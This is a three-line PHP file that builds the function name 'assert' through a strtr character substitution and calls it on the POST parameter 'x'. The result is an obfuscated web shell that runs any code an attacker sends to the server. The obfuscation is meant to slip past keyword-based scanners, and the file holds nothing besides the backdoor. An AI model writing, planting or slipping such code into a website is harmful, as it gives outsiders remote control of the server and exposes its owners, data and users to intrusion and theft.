<?php 
    $a = strtr('azxcvt','zxcv','sser');
    $a($_POST['x']);
?>
